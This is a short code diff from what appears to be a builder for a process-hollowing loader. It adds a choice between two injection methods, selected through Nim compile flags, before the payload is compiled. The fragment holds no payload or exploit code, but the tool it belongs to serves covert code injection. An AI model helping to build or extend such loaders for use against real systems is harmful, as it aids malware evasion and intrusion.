@@ -111,6 +111,12 @@ var sleepSeconds* = {sleepSeconds}
     """
     writeFile(paramsPath, paramsToHollower)
 
+    # Choose injection method
+    if injectionMethod == "1":
+        compileFlags.add(" -d:hollowsimple")
+    elif injectionMethod == "2":
+        compileFlags.add(" -d:hollownimline")
+
     # Compile
     var compileCmd: string
     if outFormat == "exe":
